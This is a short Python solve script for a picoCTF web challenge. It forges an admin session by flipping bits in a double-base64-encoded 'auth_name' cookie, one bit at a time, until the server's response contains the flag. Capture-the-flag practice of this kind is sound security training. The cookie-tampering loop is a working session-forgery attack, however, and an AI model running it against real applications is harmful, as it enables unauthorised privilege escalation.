# Inspired by https://www.youtube.com/watch?v=Fs3EbH-Wdhc

import requests
import base64
from tqdm import tqdm

ADDRESS = "http://mercury.picoctf.net:15614/"

s = requests.Session()
s.get(ADDRESS)
cookie = s.cookies["auth_name"]
# Decode the cookie from base64 twice to reverse the encoding scheme.
decoded_cookie = base64.b64decode(cookie)
raw_cookie = base64.b64decode(decoded_cookie)


def exploit():
    # Loop over all the bytes in the cookie.
    for position_idx in tqdm(range(0, len(raw_cookie))):
        # Loop over all the bits in the current byte at `position_idx`.
        for bit_idx in range(0, 8):
            # Construct the current guess.
            # - All bytes before the current `position_idx` are left alone.
            # - The byte in the `position_idx` has the bit at position `bit_idx` flipped.
            #   This is done by XORing the byte with another byte where all bits are zero
            #   except for the bit in position `bit_idx`. The code `1 << bit_idx`
            #   creates a byte by shifting the bit `1` to the left `bit_idx` times. Thus,
            #   the XOR operation will flip the bit in position `bit_idx`.
            # - All bytes after the current `position_idx` are left alone.
            bitflip_guess = (
                raw_cookie[0:position_idx]
                + ((raw_cookie[position_idx] ^ (1 << bit_idx)).to_bytes(1, "big"))
                + raw_cookie[position_idx + 1 :]
            )

            # Double base64 encode the bit-blipped cookie following the encoding scheme.
            guess = base64.b64encode(base64.b64encode(bitflip_guess)).decode()

            # Send a request with the cookie to the application and scan for the
            # beginning of the flag.
            r = requests.get(ADDRESS, cookies={"auth_name": guess})
            if "picoCTF{" in r.text:
                print(f"Admin bit found in byte {position_idx} bit {bit_idx}.")
                # The flag is between `<code>` and `</code>`.
                print("Flag: " + r.text.split("<code>")[1].split("</code>")[0])
                return


exploit()
